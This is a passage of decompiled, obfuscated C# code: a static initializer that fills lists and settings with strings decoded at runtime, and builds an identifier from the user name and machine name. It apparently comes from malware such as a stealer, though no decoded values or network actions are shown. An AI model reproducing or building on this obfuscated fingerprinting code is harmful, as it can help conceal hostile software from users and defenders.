			VrSebPGaWq(getString_0(107383346)),
			VrSebPGaWq(getString_0(107383289)),
			VrSebPGaWq(getString_0(107383224)),
			VrSebPGaWq(getString_0(107383207)),
			VrSebPGaWq(getString_0(107382630)),
			VrSebPGaWq(getString_0(107382573)),
			VrSebPGaWq(getString_0(107382540)),
			VrSebPGaWq(getString_0(107382499)),
			VrSebPGaWq(getString_0(107382426)),
			VrSebPGaWq(getString_0(107382413)),
			VrSebPGaWq(getString_0(107382864)),
			VrSebPGaWq(getString_0(107382799)),
			VrSebPGaWq(getString_0(107382790)),
			VrSebPGaWq(getString_0(107382757)),
			VrSebPGaWq(getString_0(107382684)),
			VrSebPGaWq(getString_0(107382667)),
			VrSebPGaWq(getString_0(107382078)),
			VrSebPGaWq(getString_0(107382005)),
			VrSebPGaWq(getString_0(107381992)),
			VrSebPGaWq(getString_0(107381915)),
			VrSebPGaWq(getString_0(107381902)),
			VrSebPGaWq(getString_0(107382373)),
			VrSebPGaWq(getString_0(107382268)),
			VrSebPGaWq(getString_0(107382271)),
			VrSebPGaWq(getString_0(107382198)),
			VrSebPGaWq(getString_0(107382133)),
			VrSebPGaWq(getString_0(107381608)),
			VrSebPGaWq(getString_0(107381579)),
			VrSebPGaWq(getString_0(107381502)),
			VrSebPGaWq(getString_0(107381437)),
			VrSebPGaWq(getString_0(107381440)),
			VrSebPGaWq(getString_0(107381383)),
			VrSebPGaWq(getString_0(107381830)),
			VrSebPGaWq(getString_0(107381757)),
			VrSebPGaWq(getString_0(107381760)),
			VrSebPGaWq(getString_0(107381687)),
			VrSebPGaWq(getString_0(107381638)),
			VrSebPGaWq(getString_0(107381065)),
			VrSebPGaWq(getString_0(107380992)),
			VrSebPGaWq(getString_0(107380915)),
			VrSebPGaWq(getString_0(107380882)),
			VrSebPGaWq(getString_0(107380873)),
			VrSebPGaWq(getString_0(107381276)),
			VrSebPGaWq(getString_0(107381231)),
			VrSebPGaWq(getString_0(107381142)),
			VrSebPGaWq(getString_0(107381125)),
			VrSebPGaWq(getString_0(107413352)),
			VrSebPGaWq(getString_0(107413311)),
			VrSebPGaWq(getString_0(107413214)),
			VrSebPGaWq(getString_0(107413197)),
			VrSebPGaWq(getString_0(107413108)),
			VrSebPGaWq(getString_0(107413587)),
			VrSebPGaWq(getString_0(107413526)),
			VrSebPGaWq(getString_0(107413469)),
			VrSebPGaWq(getString_0(107382573)),
			VrSebPGaWq(getString_0(107413444)),
			VrSebPGaWq(getString_0(107413371)),
			VrSebPGaWq(getString_0(107412802)),
			VrSebPGaWq(getString_0(107412725)),
			VrSebPGaWq(getString_0(107412664)),
			VrSebPGaWq(getString_0(107412671)),
			VrSebPGaWq(getString_0(107412594)),
			VrSebPGaWq(getString_0(107413089)),
			VrSebPGaWq(getString_0(107382899)),
			VrSebPGaWq(getString_0(107413024)),
			VrSebPGaWq(getString_0(107412951)),
			VrSebPGaWq(getString_0(107412894)),
			VrSebPGaWq(getString_0(107383346)),
			VrSebPGaWq(getString_0(107412309)),
			VrSebPGaWq(getString_0(107412292)),
			VrSebPGaWq(getString_0(107412203)),
			VrSebPGaWq(getString_0(107412138)),
			VrSebPGaWq(getString_0(107412569)),
			VrSebPGaWq(getString_0(107383224)),
			VrSebPGaWq(getString_0(107412524)),
			VrSebPGaWq(getString_0(107382540)),
			VrSebPGaWq(getString_0(107383207)),
			VrSebPGaWq(getString_0(107412491)),
			VrSebPGaWq(getString_0(107412402)),
			VrSebPGaWq(getString_0(107382630)),
			VrSebPGaWq(getString_0(107412369)),
			VrSebPGaWq(getString_0(107412352)),
			VrSebPGaWq(getString_0(107411759)),
			VrSebPGaWq(getString_0(107382988)),
			VrSebPGaWq(getString_0(107411734)),
			VrSebPGaWq(getString_0(107411721)),
			VrSebPGaWq(getString_0(107411692)),
			VrSebPGaWq(getString_0(107411631)),
			VrSebPGaWq(getString_0(107411618)),
			VrSebPGaWq(getString_0(107411585)),
			VrSebPGaWq(getString_0(107412072)),
			VrSebPGaWq(getString_0(107411995)),
			VrSebPGaWq(getString_0(107412002)),
			VrSebPGaWq(getString_0(107411929)),
			VrSebPGaWq(getString_0(107411916)),
			VrSebPGaWq(getString_0(107411835)),
			VrSebPGaWq(getString_0(107411298)),
			VrSebPGaWq(getString_0(107411265)),
			VrSebPGaWq(getString_0(107411188)),
			VrSebPGaWq(getString_0(107411155)),
			VrSebPGaWq(getString_0(107411146)),
			VrSebPGaWq(getString_0(107382997)),
			VrSebPGaWq(getString_0(107411835)),
			VrSebPGaWq(getString_0(107411105)),
			VrSebPGaWq(getString_0(107411076)),
			VrSebPGaWq(getString_0(107411559)),
			VrSebPGaWq(getString_0(107411478)),
			VrSebPGaWq(getString_0(107411469)),
			VrSebPGaWq(getString_0(107411376)),
			VrSebPGaWq(getString_0(107411335)),
			VrSebPGaWq(getString_0(107410794)),
			VrSebPGaWq(getString_0(107410761)),
			VrSebPGaWq(getString_0(107410688)),
			VrSebPGaWq(getString_0(107410659)),
			VrSebPGaWq(getString_0(107410582)),
			VrSebPGaWq(getString_0(107411029)),
			VrSebPGaWq(getString_0(107410996)),
			VrSebPGaWq(getString_0(107410983)),
			VrSebPGaWq(getString_0(107410922)),
			VrSebPGaWq(getString_0(107410889)),
			VrSebPGaWq(getString_0(107410812)),
			VrSebPGaWq(getString_0(107410235)),
			VrSebPGaWq(getString_0(107410202)),
			VrSebPGaWq(getString_0(107410161)),
			VrSebPGaWq(getString_0(107410144)),
			VrSebPGaWq(getString_0(107383124)),
			VrSebPGaWq(getString_0(107410115)),
			VrSebPGaWq(getString_0(107410058)),
			VrSebPGaWq(getString_0(107410529)),
			VrSebPGaWq(getString_0(107410452)),
			VrSebPGaWq(getString_0(107410443)),
			VrSebPGaWq(getString_0(107410366)),
			VrSebPGaWq(getString_0(107410337)),
			VrSebPGaWq(getString_0(107409744)),
			VrSebPGaWq(getString_0(107409727)),
			VrSebPGaWq(getString_0(107409670)),
			VrSebPGaWq(getString_0(107409613)),
			VrSebPGaWq(getString_0(107409568)),
			VrSebPGaWq(getString_0(107410007)),
			VrSebPGaWq(getString_0(107409950)),
			VrSebPGaWq(getString_0(107383067)),
			VrSebPGaWq(getString_0(107409877)),
			VrSebPGaWq(getString_0(107409848)),
			VrSebPGaWq(getString_0(107409815)),
			VrSebPGaWq(getString_0(107409806)),
			VrSebPGaWq(getString_0(107409233)),
			VrSebPGaWq(getString_0(107383717)),
			VrSebPGaWq(getString_0(107409224)),
			VrSebPGaWq(getString_0(107409143)),
			VrSebPGaWq(getString_0(107409114)),
			VrSebPGaWq(getString_0(107381440)),
			VrSebPGaWq(getString_0(107409081)),
			VrSebPGaWq(getString_0(107409114)),
			VrSebPGaWq(getString_0(107409052)),
			VrSebPGaWq(getString_0(107409055)),
			VrSebPGaWq(getString_0(107409026)),
			VrSebPGaWq(getString_0(107409457)),
			VrSebPGaWq(getString_0(107409440)),
			VrSebPGaWq(getString_0(107409367)),
			VrSebPGaWq(getString_0(107409306)),
			VrSebPGaWq(getString_0(107409277)),
			VrSebPGaWq(getString_0(107408724)),
			VrSebPGaWq(getString_0(107408711)),
			VrSebPGaWq(getString_0(107408634)),
			VrSebPGaWq(getString_0(107408601)),
			VrSebPGaWq(getString_0(107408576)),
			VrSebPGaWq(getString_0(107408499)),
			VrSebPGaWq(getString_0(107408954)),
			VrSebPGaWq(getString_0(107408921)),
			VrSebPGaWq(getString_0(107408880)),
			VrSebPGaWq(getString_0(107408851)),
			VrSebPGaWq(getString_0(107408790)),
			VrSebPGaWq(getString_0(107408757)),
			VrSebPGaWq(getString_0(107408188)),
			VrSebPGaWq(getString_0(107408147)),
			VrSebPGaWq(getString_0(107408130)),
			VrSebPGaWq(getString_0(107408097)),
			VrSebPGaWq(getString_0(107408016)),
			VrSebPGaWq(getString_0(107408003)),
			VrSebPGaWq(getString_0(107408434)),
			VrSebPGaWq(getString_0(107408421)),
			VrSebPGaWq(getString_0(107408340)),
			VrSebPGaWq(getString_0(107408307)),
			VrSebPGaWq(getString_0(107408298)),
			VrSebPGaWq(getString_0(107408257)),
			VrSebPGaWq(getString_0(107407668)),
			VrSebPGaWq(getString_0(107411469)),
			VrSebPGaWq(getString_0(107407635)),
			VrSebPGaWq(getString_0(107407626)),
			VrSebPGaWq(getString_0(107407537)),
			VrSebPGaWq(getString_0(107407508)),
			VrSebPGaWq(getString_0(107407475)),
			VrSebPGaWq(getString_0(107407954)),
			VrSebPGaWq(getString_0(107407937)),
			VrSebPGaWq(getString_0(107407908)),
			VrSebPGaWq(getString_0(107407831)),
			VrSebPGaWq(getString_0(107407818)),
			VrSebPGaWq(getString_0(107407777)),
			VrSebPGaWq(getString_0(107407208)),
			VrSebPGaWq(getString_0(107407127)),
			VrSebPGaWq(getString_0(107407098)),
			VrSebPGaWq(getString_0(107407085))
		};
		GOxsnxWeRPgV = new List<string>
		{
			VrSebPGaWq(getString_0(107407044)),
			VrSebPGaWq(getString_0(107406963)),
			VrSebPGaWq(getString_0(107407458)),
			VrSebPGaWq(getString_0(107407377)),
			VrSebPGaWq(getString_0(107407360)),
			VrSebPGaWq(getString_0(107407295)),
			VrSebPGaWq(getString_0(107406674)),
			VrSebPGaWq(getString_0(107406613))
		};
		QiqXBfsbeQblN = new List<string>
		{
			VrSebPGaWq(getString_0(107406556)),
			VrSebPGaWq(getString_0(107406523)),
			VrSebPGaWq(getString_0(107406510)),
			VrSebPGaWq(getString_0(107406941)),
			VrSebPGaWq(getString_0(107406908)),
			VrSebPGaWq(getString_0(107406891)),
			VrSebPGaWq(getString_0(107406814)),
			VrSebPGaWq(getString_0(107406781)),
			VrSebPGaWq(getString_0(107406748)),
			VrSebPGaWq(getString_0(107406715)),
			VrSebPGaWq(getString_0(107406170)),
			VrSebPGaWq(getString_0(107406137)),
			VrSebPGaWq(getString_0(107406096)),
			VrSebPGaWq(getString_0(107406087)),
			VrSebPGaWq(getString_0(107406010)),
			VrSebPGaWq(getString_0(107405977)),
			VrSebPGaWq(getString_0(107405936)),
			VrSebPGaWq(getString_0(107406415)),
			VrSebPGaWq(getString_0(107406406)),
			VrSebPGaWq(getString_0(107406333)),
			VrSebPGaWq(getString_0(107406300)),
			VrSebPGaWq(getString_0(107406259)),
			VrSebPGaWq(getString_0(107406226)),
			VrSebPGaWq(getString_0(107406556)),
			VrSebPGaWq(getString_0(107406217)),
			VrSebPGaWq(getString_0(107405664)),
			VrSebPGaWq(getString_0(107405587)),
			VrSebPGaWq(getString_0(107405554)),
			VrSebPGaWq(getString_0(107405545)),
			VrSebPGaWq(getString_0(107405504)),
			VrSebPGaWq(getString_0(107405471)),
			VrSebPGaWq(getString_0(107405910)),
			VrSebPGaWq(getString_0(107405901)),
			VrSebPGaWq(getString_0(107406523)),
			VrSebPGaWq(getString_0(107405860)),
			VrSebPGaWq(getString_0(107406510)),
			VrSebPGaWq(getString_0(107405827)),
			VrSebPGaWq(getString_0(107405794)),
			VrSebPGaWq(getString_0(107405721)),
			VrSebPGaWq(getString_0(107405688)),
			VrSebPGaWq(getString_0(107405135)),
			VrSebPGaWq(getString_0(107405126)),
			VrSebPGaWq(getString_0(107405093)),
			VrSebPGaWq(getString_0(107405060)),
			VrSebPGaWq(getString_0(107404987)),
			VrSebPGaWq(getString_0(107404946)),
			VrSebPGaWq(getString_0(107404937))
		};
		bousYWjJeLmG = new List<string>
		{
			VrSebPGaWq(iIncmAQQCyiqzep(getString_0(107405408))),
			VrSebPGaWq(getString_0(107405327)),
			VrSebPGaWq(getString_0(107405234)),
			VrSebPGaWq(getString_0(107404625)),
			VrSebPGaWq(getString_0(107404532)),
			VrSebPGaWq(getString_0(107404435)),
			VrSebPGaWq(getString_0(107404854)),
			VrSebPGaWq(getString_0(107404757)),
			VrSebPGaWq(getString_0(107404664)),
			VrSebPGaWq(getString_0(107404055)),
			VrSebPGaWq(getString_0(107403962)),
			VrSebPGaWq(getString_0(107404377)),
			VrSebPGaWq(getString_0(107404284)),
			VrSebPGaWq(iIncmAQQCyiqzep(getString_0(107405408)))
		};
		vvPDaYXldwG = VrSebPGaWq(getString_0(107404187));
		IhynlOzkYLrJ = new List<string>
		{
			VrSebPGaWq(getString_0(107403594)),
			VrSebPGaWq(getString_0(107403400)),
			VrSebPGaWq(getString_0(107403718)),
			VrSebPGaWq(getString_0(107403012)),
			VrSebPGaWq(getString_0(107403330)),
			VrSebPGaWq(getString_0(107403136))
		};
		QfFOzoRRsJbaCSrv = new List<string>
		{
			VrSebPGaWq(getString_0(107402398)),
			VrSebPGaWq(getString_0(107402369)),
			VrSebPGaWq(getString_0(107402820))
		};
		fAKdbqEizNC = getString_0(107396735);
		unMozseWIfNDzIG = getString_0(107396735);
		ftLgdfTDcbcpVyc = new DateTime(2000, 1, 1);
		NqahqjARwnLy = new DateTime(2100, 1, 1);
		CIfLKSlioN = getString_0(107397210);
		mztBYJzvvrZxTt = getString_0(107385215);
		PuBOGNfOFfnPUU = getString_0(107396735);
		ZfGFDLzYRUVOYB = getString_0(107396735);
		nHDSghdRVt = getString_0(107396735);
		rqTGwNbfEDzuKJ = getString_0(107397210);
		OZxqmZhljDlmaG = getString_0(107396735);
		ZsMYnZdnVwqV = getString_0(107396735);
		reXUufgXsSe = new List<string>
		{
			getString_0(107396136),
			getString_0(107395338),
			getString_0(107396170),
			getString_0(107395187)
		};
		qgDONLtRygbsG = getString_0(107396735);
		GaDNrTSfQzpgUqH = getString_0(107402759);
		TdPVMWBlICskiYNy = getString_0(107396735);
		MhTWjAitsIWp = getString_0(107396735);
		DoiMAWtIiwp = getString_0(107396735);
		QDnhJthsjzzs = string.Empty;
		qzispebVzedqDCRB = getString_0(107396735);
		jLtzySFoeLi = getString_0(107396735);
		mFSoAGtnwysFKkS = getString_0(107396735);
		nGnfbIaSlSQ = getString_0(107389383);
		bPTrFeZDBqpfq = getString_0(107389383);
		NMckiRPhxOGRrzLib = getString_0(107396735);
		AlZNstgAxgld = getString_0(107397210);
		rnIsguQhwxo = getString_0(107397210);
		oDoDWSVcENgJRt = getString_0(107396735);
		KDDybVhLMhFt = getString_0(107396735);
		RfJkdNJaPK = getString_0(107402754);
		NNTHjyZSeLy = getString_0(107396735);
		XoytfIUFESAvwmbb = getString_0(107396735);
		whnxscRWcwiws = getString_0(107402705);
		JhAPsHLAMSzl = getString_0(107396735);
		cFearGTCmJs = getString_0(107396735);
		bwQdyTlGESFEhTU = getString_0(107397210);
		bCrEAAPvBiMx = getString_0(107396735);
		arrfJwYoVN = getString_0(107402684);
		LLUnvLGxBbyKu = getString_0(107397210);
		MrvhpQshaKLQlY = getString_0(107397210);
		TtiqvzWhaOmd = getString_0(107396735);
		oFiUkFigqDlT = getString_0(107396735);
		oVWaGggWhTw = new string[0];
		znQoURUZOUr = getString_0(107396735);
		DseMmyGrBoOjezM = true;
		ybcuACZuGLFlw = getString_0(107396735);
		OGOvpjxWqYzkk = true;
		CqANnTqQFBLbUSD = false;
		SzJfxzWWMMuOPI = false;
		WSFPVFZwpB = false;
		DFeZKWhzZEN = getString_0(107402671);
		sfIQAmNvQu = false;
		dRIhxKCOQogmtP = false;
		wLWxiQIrycV = true;
		NlpTotdSTrdumik = false;
		ucaWVFkBOPmIjDGYC = true;
		kysrHjeTUcgeRT = getString_0(107402650) + Environment.UserName + getString_0(107402669) + Environment.MachineName + getString_0(107402616) + JVNsUrWNTuwEu.PpPaxJIRqdB() + getString_0(107402611);
		BvUqKHSXKxudwBWG = false;
		HYUCCpDWTDdNB = new Stopwatch();
		OePGqyfYpLiYf = 0;
		cLVmkVhYZQAqR = 0;
		HITrlhSdkRhVnTG = false;
		cIqGLYlhSzE = getString_0(107402634) + JVNsUrWNTuwEu.PpPaxJIRqdB() + getString_0(107402625);
		EByAfHfVeYqK = new List<string>();
		ZuwkpSyTavmCB = new List<string>();
		kboSoGMPqvw = new List<string>();
	}
}
